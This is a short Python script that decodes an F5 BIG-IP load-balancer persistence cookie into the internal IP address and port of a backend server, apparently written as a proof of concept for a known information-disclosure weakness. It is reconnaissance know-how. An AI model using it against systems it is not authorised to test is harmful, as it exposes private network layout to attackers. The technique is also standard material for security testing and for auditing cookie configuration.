import sys

def decode_ip_address(decimal_value):
    hex_value = hex(decimal_value)[2:].zfill(8)
    reversed_hex = hex_value[6:] + hex_value[4:6] + hex_value[2:4] + hex_value[:2]
    octets = [str(int(reversed_hex[i:i+2], 16)) for i in range(0, 8, 2)]
    ip_address = '.'.join(octets)
    return ip_address

def decode_port(decimal_value):
    hex_value = hex(decimal_value)[2:].zfill(4)
    reversed_hex = hex_value[2:] + hex_value[:2]
    port = int(reversed_hex, 16)
    return port

def decode_persistence_cookie(cookie):
    parts = cookie.split('.')
    encoded_ip = int(parts[0])
    encoded_port = int(parts[1])
    ip_address = decode_ip_address(encoded_ip)
    port = decode_port(encoded_port)
    return ip_address, port

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python F5_BIGIP_Cookie_Remote_Information_Disclosure.py <persistence cookie>")
        sys.exit(1)

    persistence_cookie = sys.argv[1]

    ip_address, port = decode_persistence_cookie(persistence_cookie)
    print(f"Decoded IP address: {ip_address}")
    print(f"Decoded port: {port}")
